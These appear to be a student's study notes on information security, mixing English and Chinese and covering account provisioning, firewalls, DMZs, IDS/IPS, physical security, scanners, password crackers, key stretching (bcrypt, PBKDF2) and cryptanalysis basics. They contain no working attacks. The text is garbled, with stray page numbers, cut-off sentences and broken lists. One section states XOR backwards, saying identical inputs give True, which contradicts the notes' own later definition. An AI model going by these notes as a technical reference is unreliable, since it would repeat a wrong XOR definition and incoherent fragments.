- These provide centralized access control with remote access systems such as virtual private networks (VPNs) and other types of network access servers. They help protect internal LAN authentication systems and other servers from remote attacks.
- When using a separate system for remote access, a successful attack on the system only affects the remote access users. In other words, the attacker won’t have access to internal accounts. Mobile IP, which provides access to mobile users with smartphones, also uses AAA protocols.
 Managing the Identity and Access Provisioning Life Cycle
- The identity and access provisioning life cycle refers to the creation, management, and deletion of accounts. Although these activities may seem mundane, they are essential to a system’s access control capabilities.
- Without properly defined and maintained user accounts, a system is unable to establish accurate identity, perform authentication, provide authorization, or track accountability. As mentioned previously, identification occurs when a subject claims an identity. This identity is most commonly a user account, but it also includes computer accounts and service accounts.  Access control administration is the collection of tasks and duties involved in managing accounts, access, and accountability during the life of the account.
These tasks are contained within three main responsibilities of the identity and access provisioning life cycle:
1. Provisioning
2. account review
3. account revocation
 Provisioning
- An initial step in identity management is the creation of new accounts and provisioning them with appropriate privileges. Creating new user accounts is usually a simple process, but the process must be protected and secured via organizational security policy procedures.
- User accounts should not be created at an administrator’s whim or in response to random requests. Rather, proper provisioning ensures that personnel follow specific procedures when creating accounts.
 Account Review
Accounts should be reviewed periodically to ensure that security policies are being
enforced. This includes ensuring that inactive accounts are disabled and employees do not have excessive privileges.
Many administrators use scripts to check for inactive accounts periodically. example, a script can locate accounts that users have not logged onto in the past 30 days, and automatically disable them. Similarly, scripts can check group membership of privileged groups (such as administrator groups) and remove unauthorized accounts.
- Account review is often formalized in auditing procedures.  Account Revocation
When employees leave an organization for any reason, it is important to disable their
user accounts as soon as possible. This includes when an employee takes a leave of absence.
Whenever possible, HR personnel should have the ability to perform this task because they are aware when employees are leaving for any reason. example, HR personnel know when an employee is about to be terminated, and they can disable the account during the employee exit interview.
If a terminated employee retains access to a user account after the exit interview, the risk for sabotage is very high. Even if the employee doesn’t take malicious action, other employees may be able to use the account if they discover the password. Logs will record the activity in the name of the terminated employee instead of the person actually taking the action.
Protocol analyzer
Allow to view IPv4 packet data on a particular internal network segment.
Firewall Inspection Types
packet-filtering firewall: 封包過濾防火牆
  - inspect traffic based solely on a packet’s header.
stateful firewall: 狀態檢視防火牆
  - can recognize whether if the packet is part of a session originated
inside the local network or outside the local network.
  ⁃
Packet-Filtering Firewall
- An ACL can decide if a packet should be permitted or denied based on the contents of its header
◦ Example, based on source and destination IP address or port number information
- A device that filters traffic based on ACL-like rules is a packet filtering firewall.
◦ 優點:
▸ 建置簡單便宜
▸ 效率佳。
▸ 具透通性，用戶端機器無需作任何設定。
◦ 缺點:
▸ 難以設計⻑期有效又正確的無誤過濾規則。
▸ 無法處理應用層協定，所以對於封包資料段或特定 應用服務弱點的攻擊方式無能為
力。
▸ 缺乏驗證能力。
▸ 安全性較差。
- lacks flexibility.
- Example:
- Router is acting as a firewall. The ACL applied to interface Serial 1/0/1.
- The ACL: permits all traffic from the inside network to go out to the Internet.
But blocked all traffic coming from the Internet.
- seem like a reasonable ACL, but it prevent a session from being set up
between a client on the inside network with a host on the Internet, even if the session originated from the inside client.
◦ an inside client running a web browser attempts to contact a web server on the Internet.
◦ Although the outgoing HTTP request is permitted, the returning HTTP reply is blocked by the incoming ACL applied to interface Serial 1/0/1.
◦
•
•
◦ stateful firewall inspects traffic leaving the inside network as it goes out to the Internet.
◦ when returning traffic from the same session (as identified by source and destination IP addresses and port numbers) attempts to enter the inside network,
◦ the stateful firewall permits that traffic.
- 狀態檢視防火牆不僅採用封包過濾類似的方法來監控網路傳輸，還會更進一步檢查封
包資料流的內容與行為，並非只是單純地過濾個別封包。
- 持續追蹤連接狀態直到結束連線為止，藉以判斷是否為有效的連線而允許封包通過。 - 建立每個連線階段的狀態表，然後根據此前後關聯狀況來判斷是否允許或拒絕此封包
通過。(monitor the state of the connection at all times)
- a stateful firewall allows return traffic from the Internet for a Telnet session
initiated from the inside network (session A)
- However, Telnet traffic coming from the Internet is blocked, if the Telnet
session is initiated from a device on the Internet (session B).
As a result, the HTTP session cannot be established.
 Stateful Firewall
stateful inspection: The process of inspecting traffic to identify unique sessions   Firewall Zones
Firewall’s interfaces can be defined as belonging to different firewall zones.
  - First define which interfaces belong to which zones
  - set up rules (what types of traffic are permitted to flow) between
zones. Example:
  - INSIDE zone:The firewall interface connecting to the inside network (trusted network)
  - OUTSIDE zone: The firewall interface connecting to the Internet (untrusted network)
  - Rule has been applied to the firewall:
  - the traffic source from the INSIDE zone is allowed to go to the
OUTSIDE zone.
  - Return traffic from sessions originating in the INSIDE zone is
also permitted to come back into the INSIDE zone from the
OUTSIDE zone (stateful inspection)
  - But, traffic from sessions originating in the OUTSIDE zone are not permitted to come into the INSIDE zone.
⁃
Demilitarized zone (DMZ).
Often contains servers (can be accessible from the public Internet)
  Can protect servers provided to external clients without completely eliminating access for internal users
A lightly protected subnet consisting of publicly available servers
placed on the outside of the company's firewall
  Intrusion Detection/Prevention system
When attacker launches an attack against a network, intrusion detection system (IDS) and intrusion prevention system (IPS) technologies are often able to recognize the attack and respond appropriately.
Attacks might be recognizable by comparing incoming data streams against a database of well-known attack signatures.
detecting attacks include policy-based and anomaly-based approaches. IPS software can be installed.
  - dedicated network-based intrusion prevention system (NIPS) sensors
  - Or on a host to provide a host-based intrusion prevention system (HIPS) solution.
IDS Versus IPS
- both devices can recognize network attacks, primarily differ in network placement.
- See if the analyzed traffic flow through the device:
◦ No: an IDS device receives a copy of traffic to be analyzed, passive
◦ Yes: an IPS device resides in-line with the traffic. IPS device is
considered to be active.
- Both devices can send alerts to, like, a management station.
- IDS device:
◦ can communicate with a security appliance/router to prevent subsequent
attack packets,
◦ But the initially offending traffic reaches its destination.
- IPS device:
◦ can drop the traffic in-line,
◦ Can prevent even the first malicious packet from reaching its intended
target.
- might seem that IPS devices better than IDS devices, but dependent the
 network environments: - Example:
◦ IDS device
▸ can add to a network that already have IPS device, verify the IPS
device is still operational.
▸ might also identify suspicious traffic, send alerts without having the
IPS device drop the traffic.
- IDS and IPS Device Categories
◦ IDS and IPS devices can be categorized based on how they detect malicious traffic.
◦ IPS devices can be categorized based on whether they run on a network device or on a host.
- Detection Methods
◦ approaches for detecting or preventing malicious traffic:
▸ Signature-based detection ▸ Policy-based detection
▸ Anomaly-based detection
◦ Signature-Based Detection
▸ The primary method used to detect and prevent attacks using IDS or IPS technologies.
▸ A signature could be a string of bytes, in a certain context, that triggers detection.
▸ Example:
- attacks against a web server typically take the form of URLs.
◦ Therefore, URLs could be searched for a certain string that would identify an attack
◦ against a web server.
- the IDS or IPS device could search for a pattern in the MIME
header of an e-mail message.
◦ because signature-based IDS/IPS is based on signatures, the
administrator needs to routinely update those signature
files.
◦ Policy-Based Detection:
▸ the IDS/IPS device needs a specific declaration of the security policy.
▸ Example:
- write a network access policy, identified which networks could communicate with other networks.
- The IDS/IPS device could then recognize out-of-profile traffic
that does not conform to the policy, and then report that
activity.
◦ Anomaly-Based Detection : behavior-based detection.
▸ A third approach to detecting or preventing malicious traffic
▸ This approach is prone to false positives, because a normal condition
is difficult to measurably define.
▸ However, there are a couple of options for detecting anomalies:
- Statistical anomaly detection:
◦ watches network-traffic patterns over a period of time and dynamically builds a baseline.
◦ If traffic patterns significantly vary from the baseline, an alarm can be triggered.
- Non-statistical anomaly detection:
◦ allows an administrator to define what traffic patterns are supposed to look like.
◦ could lead to a false positive
▸ (an alarm being triggered in the absence of malicious
traffic).
◦ example:
▸ Microsoft released a large service pack for its Windows 7 OS,
▸ your company hundreds of computers automatically download that service pack.
▸ If the same time tomorrow morning, multiple copies of the service pack simultaneously start to download from www.microsoft.com,
▸ the IDS/IPS device might consider that traffic pattern to be significantly outside of the baseline.
▸ As a result, lead to a false positive
▸ an alarm being triggered in the absence of malicious
traffic.  Deploying Network-Based and Host-Based Solutions
- network-based IDS (NIDS), network-based IPS (NIPS),
- NIPS and HIPS solutions can work in tandem. 串联
- Example:
◦ NIPS solution can inspect traffic flowing through the network
◦ what if a host had a SSL connection to a server, and the malicious traffic
traveled over the SSL connection?
◦ Then, the NIPS hardware is unable to analyze the malicious traffic,
because it would be encrypted inside of the SSL connection.
◦ However, a HIPS software solution could analyze the malicious traffic
after the traffic was decrypted on the host.
- NIPS device can: prevent a DoS attack or recognize network reconnaissance
patterns
- HIPS solution: focus on the protection of applications and host resources.
- the deployment of NIDS, NIPS, and HIPS technologies in the same network.
- Notice the sensors are strategically deployed at network boundaries (that is,
coming into the network from the Internet and going into the DMZ).
- both NIDS and NIPS devices complement the functions of one another.
- Additionally, HIPS software is deployed on strategic hosts (the HTTP, DNS,
and e-mail hosts in there)
- The NIDS, NIPS, and HIPS devices can all send any alarms triggered on their
respective devices to a management console.
- Using input from these diverse sources, the management console software
might be able to perform event correlation to recognize broader network
attack patterns, rather than just examining a single
- attack against a single device.
- Define Key Terms - symmetric encryption, asymmetric encryption,
- Advanced Encryption Standard (AES),
- RSA, pretty good privacy (PGP), GNU Privacy Guard (GPC), public key
infrastructure (PKI),
- Challenge-Response Authentication Mechanism Message Digest 5 (CRAM-
MD5),
- denial of service (DoS), social engineering, FTP bounce, distributed denial of
service (DDoS), buffer overflow, security policy, acceptable use policy
(AUP),
- Nessus®, Nmap,
- honey pot, honey net,
- access control list (ACL),
- Kerberos, Remote Authentication Dial-In User Service (RADIUS),
- Terminal Access Controller Access-Control System Plus (TACACS+),
- two-factor authentication, multifactor authentication,
- single sign-on (SSO), •
- software firewall, hardware firewall, stateful firewall, demilitarized zone
(DMZ),
- virtual private network (VPN),
- site-to-site VPN, client-to-site,
- remote access VPN, IP security (IPsec), Internet Key Exchange (IKE), Internet
Security Association and Key Management Protocol (ISAKMP),
- security association (SA), Authentication Header (AH), Encapsulating
Security Payload (ESP), Secure Sockets Layer (SSL),
- Layer 2 Tunneling Protocol (L2TP), Layer 2 Forwarding (L2F),
- Point-to-Point Tunneling Protocol (PPTP),
- intrusion detection system (IDS), intrusion prevention system (IPS),
- network-based IDS (NIDS), network-based IPS (NIPS), host-based IPS
(HIPS)
Physical Security
1 Physical Protections and Attacks
- Location protection:
◦ the protection of the physical location where computer hardware
resides (like locks)
- Physical intrusion 闯入 detection:
◦ the detection of unauthorized access to the physical location.
- Hardware attacks: ◦ physically attack the hardware, like hard drives, network adapters, memory chips, and microprocessors.
- Eavesdropping:
◦ monitor light, sound, radio, or other signals to detect communications or computations.
- Physical interface attacks:
◦ attacks that penetrate a system’s security by exploiting a weakness
in its physical interface.
2 Locks and Safes 2.1 Lock Technology
- Pin Tumbler Locks
- Tubular and Radial Locks
- Wafer Tumbler Locks •
2.2 Attacks on Locks and Safes
2.3 The Mathematics of Lock Security
3 Authentication Technologies 3.1 Barcodes
3.2 Magnetic Stripe Cards
3.3 Smart Cards
3.4 RFIDs
3.5 Biometrics
4 Direct Attacks Against Computers
4.1 Environmental Attacks and Accidents 4.2 Eavesdropping
4.3 TEMPEST
4.4 Live CDs
4.5 Computer Forensics 5 Special-Purpose Machines 5.1 Automated Teller Machines 5.2 Voting Machines
6 Physical Intrusion Detection 6.1 Video Monitoring
6.2 Human Factors and Social Engineering
CNA Tools
Scanners
Perhaps the most straightforward cracking tool
System administrators: detect weaknesses in their own networks. Hacker: same purpose.
Scanner:
to query each of the target server‘s TCP/IP ports to determine which are open (open ports might allow the hacker access to vulnerable parts of the system.) or if it requires authentication (like password)
Scanners are fairly simple to write and download, some for free.
The problem for websites comes from the fact that many websites are built using a variety of technologies so every update of those individual technologies has the potential to introduce new vulnerabilities.
So every IT department is always playing catch-up to update software and, in an ideal world, they would be running a new vulnerability scan after each patch.
increasingly, hackers are using vulnerability scanners to find holes due to lapses in patching.
And the truth is that vulnerability scanners are automated tools also known as bots that are being used all over the internet looking for weaknesses to exploit.
example:
a known vulnerability in a certain version of
WordPress. (Website to help build your custom
website)
Of course, WordPress will fix the gap and release
a new version without the vulnerability. However, any websites that fail to update, will continue to have the vulnerability.
Now, malicious users can send a scanner, to
probe the internet looking for sites running that unsecured version of Wordpress, with that particular vulnerability.
Once they have a list of websites that are running the unpatched version, they now have a known target with a known vulnerability they can exploit.
Password Crackers
When hacker access a system that is password-protected, he might use password cracker to gain access.
Passwords are typically encrypted to prevent their interception / use by unauthorized parties,
However, the currently accepted standard is vulnerable. Like DES (short for data encryption standard).
good news: new, stronger encryption standard is on the way.
bad news: password cracker doesn‘t need to decipher a password to
crack it.
  - It takes a list of common words and phrases which it assumes
at least one account will have for a password,
  - or rapidly combines strings of letters and numbers, and encrypts each possibility using the DES algorithm.   - Then runs each combination for matches; if a user has a common word or phrase as a password, the hacker will in all likelihood find it.
System administrators also / often run password crackers:
  - they can notify a user when his or her password has been
cracked, and help that person select a better one.
Password crackers take a lot of time, but if the system administrator does not detect bad passwords, educate users on password
selection, they can be effective.5
According to one administrator, “generally we find 30 percent of
passwords on previously unsecured systems.” passive defense against password crackers is only as good as the system administrator.
 Encryption Terms
There are several terms within cryptography that are important to grasp. Understanding these terms makes it much easier to understand many of the more advanced concepts:
- Random and pseudo-random numbers.
  - Many encryption schemes require a random or pseudo-random number as an input.
  - pick a number completely by chance, it is a random number.
  - computers don’t do things by chance, so difficult to get a true random number. Instead, computers often use techniques to obtain pseudo- random numbers.
  - A pseudo-random number appears to be random, but it is created by a deterministic algorithm.
  - given the same input, a pseudo-random number generator will produce the same output.
- IV initialization vector:
  - provides a starting value for a cryptographic algorithm.
  - It is a fixed-size random or pseudo-random number, helps create random encryption keys.
  - Ideally, the IV should be large enough so that the algorithm doesn’t reuse the same IV and re-create the same encryption keys.
- Nonce:
  - a number used once
  - IV should be large enough so that it is only used once.
  - Many cryptographic algorithms use a random or pseudo- random
nonce as a seed or a starting number.
- XOR   - a logical operation used in some encryption schemes.
  - XOR operations compare two inputs. If the two inputs are the same, it outputs True (or a binary 1). If the two inputs are different, it outputs False (or a binary 0).
- Confusion: the ciphertext is significantly different than the plaintext.
  - Example
  - encrypting the words “I passed!” with Advanced Encryption Standard (AES), it results in the following text: nkm6olLdchB049LbrCpL5Q.
- Diffusion: ensure that small changes in the plaintext result in large changes in the ciphertext.
- Secret algorithm: one that is kept private.
  - Security experts discourage this practice because it prevents a review
of the algorithm by experts and mathematicians.
  - Vigorous reviews can discover any flaws or potential weaknesses.
  - In contrast, most algorithms are published and known.
- Weak/deprecated 反对 algorithms.
  - A weak algorithm can be cracked, allowing an attacker to easily
convert ciphertext back to plaintext.
  - When flaws are discovered in algorithms, experts and authorities recommend deprecating the weak algorithm.
  - Example:
  - web sites commonly used Secure Sockets Layer (SSL) to encrypt
HTTPS sessions on the Internet.
  - However, experts discovered flaws in SSL and most authorities have deprecated the use of SSL and recommend the use of TLSinstead. discovers part of the key.
  - A common use case for encryption algorithms is to provide high resiliency
  - Ideally, keys are not susceptible to leakage, preventing attackers from gaining information on any part of a key.
  - However, there are many situations that can cause leakage.
  - A strong algorithm implements high-resiliency techniques that ensure
this leakage does not compromise the encryption key.
Cryptographic Basics Goals of Cryptography
use cryptographic to meet 4 fundamental goals:
- confidentiality,
- integrity,
- authentication: positively identifying a party as a user/computer/service.
  - authentication of software drivers / message / identity. - nonrepudiation.
  - common measures: digital certificates, digital signature, messaging authentication codes (MACs) and IPSec.
  - common use: message and email system. Confidentiality
- ensures that data remains private while at rest / stored, or in transit / on the wire (referring to the network cables that carry data communications)
- Data-at-rest: any data stored on media.
  - Example: encrypt individual fields in a database (such as the fields holding customer credit card data), individual files, folders, or a full disk.
- Data-in-transit: any data sent over a networkt.
  - Example: e-commerce web sites commonly use Hypertext Transfer Protocol Secure (HTTPS) sessions to encrypt transactions that include credit card data.
  - If attackers intercept the transmissions, they only see ciphertext.
- Data-in-use: data being used by a computer.
  - Because the computer needs to process the data, it is not encrypted while in use.
  - If the data is encrypted, an application will decrypt it and store it in memory while in use.
  - If the application changes the data, it will encrypt it again before saving it.
  - Additionally, applications purge memory of sensitive data after processing it.
- ensures that data is only viewable by authorized users. Encryption protects the confidentiality of data.
2 main types of cryptosystems enforce confidentiality.
- Symmetric key cryptosystems: shared secret key available to all users of the cryptosystem. - Asymmetric cryptosystems: use individual combinations of public and private keys for each user of the system.
  - Asymmetric encryption requires a Public Key Infrastructure (PKI) to issue certificates.
  - ncrypted with the public key can only be decrypted with the matching private key.
  - encrypted with the private key can only be decrypted with the matching public key.
- Stream ciphers encrypt data 1 bit at a time.
- Block ciphers encrypt data in blocks.
- Steganography: hiding data within other files
  - Example: in the white space of a picture file.
When developing a cryptographic system, two different types of data:
- Data at rest / stored data: resides in a permanent location awaiting access.
  - Examples:
  - stored on hard drives, backup tapes, cloud storage services, USB devices, other storage media...
  - more susceptible 易受影响的 to the theft of physical devices.
- Data in motion / on the wire: data being transmitted across a network
between two systems.
  - might be traveling on a corporate or wireless network, or the public Internet.
  - may be susceptible to eavesdropping attacks These encryption methods include two elements:
Algorithm: The algorithm performs mathematical calculations on data. The algorithm is always the same Key: a number that provides variability for the encryption. kept private and/or changed frequently.
Integrity
ensures that data is not altered without authorization between the time it was created and the time it was accessed.
- Integrity controls protect against all forms of alteration:
- intentional alteration by a third party attempting to insert false information
- unintentional alteration by faults in the transmission process.
Message integrity is enforced through the use of encrypted message digests (digital signatures) created upon transmission of a message.
- The recipient of the message simply verifies that the message’s digital signature is valid, ensuring that the message was not altered in transit.
- digital signature: provides authentication, non-repudiation, and integrity. Integrity can be enforced by both public and secret key cryptosystems. Hashing ensures that data has retained integrity.
- Hash: a number derived from performing a calculation on data, message, patch, or file.
- creates a fixed-size string of bits or hexadecimal characters, which cannot be reversed to re-create the original data.
- Common hashing algorithms:MD5,Secure Hash Algorithm (SHA).
Authentication
verifies the claimed identity of system users and is a major function of cryptosystems. example, suppose that Bob wants to establish a communications session with Alice and they are both participants in a shared secret communications system. Alice might use a challenge-response authentication technique to ensure that Bob is who he claims to be.
 In this example, the shared-secret code used by Alice and Bob is quite simple—the letters of each word are simply reversed.
Bob first contacts Alice and identifies himself.
Alice then sends a challenge message to Bob, asking him to encrypt a short
message using the secret code known only to Alice and Bob.
Bob replies with the encrypted message.
After Alice verifies that the encrypted message is correct, she trusts that Bob
himself is truly on the other end of the connection.
Nonrepudiation
provides assurance to the recipient that the message was originated by the sender and not someone masquerading as the sender.
It also prevents the sender from claiming that they never sent the message in the first place (repudiating the message).
Secret key / symmetric key cryptosystems (like simple substitution ciphers) do not provide this guarantee of nonrepudiation.
If Jim and Bob participate in a secret key communication system, they can both produce the same encrypted message using their shared secret key.
Nonrepudiation is offered only by public key / asymmetric cryptosystems. Key Stretching 伸展
many password attacks attempt to discover a password by calculating a hash on a
guessed password, and then comparing it with the stored hash of the password. Using complex passwords doesn’t prevent them all.
Key stretching (key strengthening):
- a technique used to increase the strength of stored passwords
  - help thwart brute force and rainbow table attacks.
  - incresa times to brute force
- Key stretching techniques salt the passwords with additional random bits to make them even more complex.
- Two common key stretching techniques:
Bcrypt
- a key-stretching mechanism
- used on many Unix and Linux distributions
- to protect the passwords stored in the shadow password file.
- uses the Blowfish cipher and salting, and adds an adaptive function to increase
the number of iterations.
  - based on the Blowfish block cipher
  - salts the password by adding additional random bits before encrypting
it with Blowfish.
  - Bcrypt can go through this process multiple times to further protect
against attempts to discover the password.
  - The result is a 60-character string.
- The result is the same as other key-stretching mechanisms, (single use is computationally feasible),
  - but when attempting to brute force the function, the billions of attempts make it computationally unfeasible. - ▪


## - - - ▪


## ▪
Example
password is IL0ve$ecurity, an application can encrypt it with bcrypt and a random salt.
It might look like this, which the application stores in a database:
$2b$12$HXIKtJr93DH59BzzKQhehOI9pGjRA/03ENcFRby1jH7nXwt1T
Later, when a user authenticates with a username and password,
the application runs Bcrypt on the supplied password and compares it with the stored bcrypt-encrypted password.
If same, the user is authenticated.
added measure, it’s possible to add some pepper to the salt to further - Pepper: anotherset of random bits stored elsewhere.
PBKDF2 Password-Based Key Derivation Function 2
- a key derivation function
- produce a key derived from a password.
- Many algorithms use PBKDF2 to increase the security of passwords:Wi-Fi Protected Access II (WPA2), Apple’s iOS, and Cisco operating systems
- Uses a password / passphrase and a salt and applies a HMAC to the input 1000+ times.
  - uses salts of at least 64 bits and uses a pseudo-random function such as HMAC to protect passwords.
  - Some app send the password through the PBKDF2 process as many as 3,187
As an 1,000,000 times to create the hash.
  - The size of the resulting hash varies with PBKDF2 depending on how it is implemented.
  - most common Bit sizes: 128, 256, and 512 bits
  - The repetition makes brute-force attacks computationally unfeasible.
Some security experts believe that PBKDF2 is more susceptible to brute force attacks than bcrypt.
- A public group created the Password Hashing Competition (PHC).
- They received and evaluated 24 different hashing algorithms as alternatives.
- In July 2015, they selected Argon2 as the winner of the competition and recommended it be used instead of legacy algorithms such asPBKDF2.
PBKDF2 With Hmac SHA1
- ▪


## 较高密码安全实现使用 PBKDF2 With Hmac SHA1 算法 硬件的速度已经远远超过任何使用字典或彩虹表进行的暴力攻击， 并且任何密码都能被破解，只是使用时间多少的问题。
  - 为了解决这个问题，尽可能降低暴力攻击速度。
  - 目标是使 Hash 函数足够慢以妨碍攻击，并对用户来说仍然非常
  快且不会感到有明显的延时。
  - 要达到这个目的通常是使用某些 CPU 密集型算法来实现:
  - 比如 PBKDF2, Bcrypt 或 Scrypt 。
  - 这些算法采用 work / security factor 或迭代次数作为参数来确定
Hash 函数将变的有多慢，并且随着日后计算能力的提高，可以 逐步增大 work factor 来使之与计算能力达到平衡。 Cryptosystem attacks
- Cryptanalysis:The science of attacking cryptosystems
- Cryptanalysts: practitioner.
- Always assume the cryptanalyst knows which cryptosystem we are using.
- 4 primary types of attacks that a cryptanalyst can attempt to perform on a given cryptosystem.
  - Ciphertext-only attack:
  - has access to the ciphertext of one or more messages,
  - all were encrypted using the same key, K.
  - determine the plaintext for one or more of these ciphertexts or, better yet, to discover K.
  - Known-plaintext attack:
  - cryptanalyst has access to one or more plaintext-ciphertext
pairs, know both, plain and cipher text.
  - each plaintext was encrypted using the same key, K.
  - Cryptanalyst goal is to determine the key, K.
  - Chosen-plaintext attack:
  - cryptanalyst can chose one or more plaintext messages and get the ciphertext that is associated with each one, based on the use of same key, K.
  - In the offline chosen-plaintext attack, the cryptanalyst must choose all the plain- texts in advance, whereas in the adaptive chosen-plaintext attack, the cryptanalyst can choose plaintexts in an iterative fashion, where each plaintext choice can be based on information he gained from previous plaintext encryptions.
  - Chosen-ciphertext attack:
  - cryptanalyst can choose one or more ciphertext messages and get the plaintext that is associated with each one, based on the use of same key, K.
  - As with the chosen-plaintext attack, this attack also has both offline and adaptive versions.  - It’s easy to recognize that a message is a valid plaintext.
  - This ability is related to the unicity distance for a cryptosystem
  - the minimum number of characters of ciphertext that are needed so that there is a single intelligible plaintext associated with it. Cryptography Concepts
plaintext message, P, uses a cryptographic algorithm to encrypt the plaintext message, produce ciphertext message, C.
This message is transmitted by some physical or electronic means to the recipient. The recipient then uses a predetermined algorithm to decrypt the ciphertext message and retrieve the plaintext version.
All cryptographic algorithms rely on keys to maintain their security.
  - a key is usually a very large binary number.
  - Every algorithm has a specific key space, the range of values that are valid for use as a key for a specific algorithm.
  - A key space is defined by its bit size.
  - Bit size n : the number of binary bits (0s and 1s) in the key.
  - key space 0-2^n: the range between the key that has all 0s and the key that has all 1s.
  - a 128-bit key can have a value from 0 to 2128 (roughly 3.40282367 * 1038, very big number).
  - It is absolutely critical to protect the security of secret keys. In fact, all of the security you gain from cryptography rests on your ability to keep the keys used private.     The Kerchoff Principle
All cryptography relies on algorithms.
An algorithm: a set of rules, usually mathematical, dictates how enciphering and deciphering processes are to take place.
Most cryptographers follow the Kerchoff principle/assumption:
a concept that makes algorithms known and public, allowing anyone to examine
and test them.
a cryptographic system should be secure even if everything about the system, except the key, is public knowledge. The principle can be summed up as “The enemy knows the system.”
A large number of cryptographers adhere to this principle, but not all agree. In fact, some believe that better overall security can be maintained by keeping both the algorithm and the key private. Kerchoff’s adherents retort 反驳 that the opposite approach includes the dubious 冒⻛险的 practice of “security through obscurity” and believe that public exposure produces more activity and exposes more weaknesses more readily, leading to the abandonment of insufficiently strong algorithms and quicker adoption of suitable ones.
 As you’ll learn in this chapter and the next, different types of algorithms require different types of keys.
In private/secret key cryptosystems, all participants use a single shared key. In public key cryptosystems, each participant has their own pair of keys. Cryptographic keys are sometimes referred to as cryptovariables 密码变量. cryptology: cryptography and cryptanalysis
  - Cryptography 密码使用法: creating and implementing secret codes and ciphers.
  - Cryptanalysis 密码分析学: the study of methods to defeat codes and ciphers.
Cryptosystems: Specific implementations of a code or cipher in hardware and 3,193

software.
Federal Information Processing Standard (FIPS) 140–2, “Security Requirements for Cryptographic Modules,” defines the hardware and software requirements for cryptographic modules that the federal government uses.
Whether you are using asymmetric or symmetric cryptography, it is important to use only proven cryptography technologies.
Kerckhoffs’ principle (key principles)
by Auguste Kerckhoffs, nineteenth century.
the security of an algorithm = only on the secrecy of the key, not on the secrecy of the algorithm itself.
means that the algorithm can be public, and the process still be secure as you keep the specific key secret.
Security through obscurity
Keeping a cryptographic method secret, makes it impossible for it to be tested by the cryptographic community, hidde the details, hope that no attacker finds them, is not secure
a very bad approach to security.
Cryptographic Mathematics
Cryptography is no different from most computer science disciplines in that it finds its foundations in the science of mathematics.
Boolean Mathematics
Boolean mathematics 布尔数学体系: defines the rules used for the bits and bytes that form the nervous system of any computer.
the decimal system, a base 10 system in which an integer from 0 to 9 is used in each place and each place value is a multiple of 10.
Similarly, the computer’s reliance upon the Boolean system has electrical origins. In an electrical circuit, there are only two possible states
  - on (representing the presence of electrical current)
  - off (representing the absence of electrical current).
  - All computation performed by an electrical device must be expressed in these terms, giving rise to the use of Boolean computation in modern electronics.
  - In general, computer scientists refer to the on condition as a true value and the off condition as a false value.
Logical Operations
The Boolean mathematics of cryptography uses a variety of logical functions.
AND ∧
whether two values are both true.  The output value is true only in columns where both X and Y are true.
OR ∨
whether at least one of the input values is true.
the OR function returns a false value only when both input values are false.
NOT ∼ or !
simply reverses the value of an input variable.
  Exclusive OR / XOR ⊕
the most important and most commonly used in cryptographic applications
The XOR function returns a true value when only one of the input values is true.
If both values are false or both values are true, the output of the XOR function is false.
Modulo Function (mod)
The modulo function is the remainder value left over after a division. 8 mod 6 = 2
6 mod 8 = 6
10 mod 3 = 1
10 mod 2 = 0
 32 mod 8 = 0
One-Way Functions
a mathematical operation that easily produces output values for each possible combination of inputs but makes it impossible to retrieve the input values.
Public key cryptosystems are all based on some sort of one-way function.
In practice it’s never been proven that any specific known function is truly one way. Cryptographers rely on functions that they suspect may be one way, but it’s theoretically possible to be broken by future cryptanalysts.
Here’s an example.
Imagine you have a function that multiplies three numbers together.
If you restrict the input values to single-digit numbers, it’s a relatively straightforward matter to reverse-engineer this function and determine the possible input values by looking at the numerical output.
example, the output value 15 was created by using the input values 1, 3, and 5.
However, suppose you restrict the input values to five-digit prime numbers.
It’s still quite simple to obtain an output value, but reverse-engineering is not quite so simple.
like figure out what three prime numbers to obtain the output value 10,718,488,075,259.
Not so simple (As it turns out, the number is the product of the prime numbers 17,093; 22,441; and 27,943.)
might be attacked using a computer and a brute-force algorithm, but there’s no easy way to figure it out in your head.
Nonce
a random number: acts as a placeholder variable in mathematical functions.   - Cryptography often gains strength by adding randomness to the encryption process.
When the function is executed, the nonce is replaced with a random number generated at the moment of processing for one-time use.
The nonce must be a unique number each time it is used.
A more recognizable examples of nonce: initialization vector (IV)
  - a random bit string that is the same length as the block size and is XORed with the message.
  - IVs are used to create unique ciphertext every time the same message is encrypted using the same key.
Zero-Knowledge Proof
One of the benefits of cryptography is found in the mechanism to prove your knowledge of a fact to a third party without revealing the fact itself to that third party.
This is often done with passwords and other secret authenticators.
The classic example of a zero-knowledge proof involves two individuals:
Peggy knows the password to a secret door located inside a circular cave
Victor want to buy the password from Peggy after Peggy prove the password.
Peggy doesn’t want to tell Victor the password for fear that he won’t pay later.
The zero-knowledge proof can solve their dilemma.
Victor can stand at the entrance to the cave and watch Peggy depart down the path.
Peggy then reaches the door and opens it using the password. She then passes through the door and returns via path 2.
Victor saw her leave down path 1 and return via path 2, proving that she must know the correct password to open the door.  Split Knowledge
split knowledge:
the information or privilege required to perform an operation is divided among
multiple users,
no single person has sufficient privileges to compromise the security of an environment.
separation of duties and multiple people control contained in a single solution. The best example of split knowledge: key escrow 由第三者保存附带条件委付盖印
的契约.
Using key escrow, cryptographic keys, digital signatures, and even digital certificates can be stored/backed up in a special database, key escrow database.
In the event a user loses or damages their key, that key can be extracted from the backup.
However, if only a single key escrow recovery agent exists, there is opportunity for fraud and abuse of this privilege.
M of N Control: requires a minimum number of agents (M) out of the total number of agents (N) work together to perform high-security tasks.
  - three of eight controls: require three people out of the eight with the assigned work task of key escrow recovery agent to work together to pull a single key out of the key escrow database
  - (thereby also illustrating that M is always less than or equal to N).
Work Function
measure the strength of a cryptography system by measuring the effort in terms of cost or time using a work function/factor.
Usually the time and effort required to perform a complete brute-force attack against an encryption system is what the work function represents.
The security and protection offered by a cryptosystem is directly proportional to the value of the work function/factor.
The size of the work function should be matched against the relative value of the protected asset.
The work function need be only slightly greater than the time value of that asset.
In other words, all security, including cryptography, should be cost effective and efficient. Spend no more effort to protect an asset than it warrants, but be sure to provide sufficient protection.
Thus, if information loses its value over time, the work function needs to be only large enough to ensure protection until the value of the data is gone.
Syskey The SAM Lock Tool, better known as Syskey (the name of its executable file) is a discontinued component of Windows NT that encrypts the Security Account Manager (SAM) database using a 128-bit RC4 encryption key.
First introduced in the Q143475 hotfix which was included in Windows NT 4.0 SP3, it was removed in Windows 10 1709, due to its use of cryptography considered insecure by modern standards, and its use as part of scams as a form of ransomware. Microsoft officially recommended use of BitLocker disk encryption as an alternative.
Ciphers
Cipher systems have long been used by individuals and governments interested in preserving the confidentiality of their communications.
these concepts seem somewhat basic, but when used in combination, they can be formidable 可怕的 opponents and cause cryptanalysts many hours of frustration.
Codes vs. Ciphers
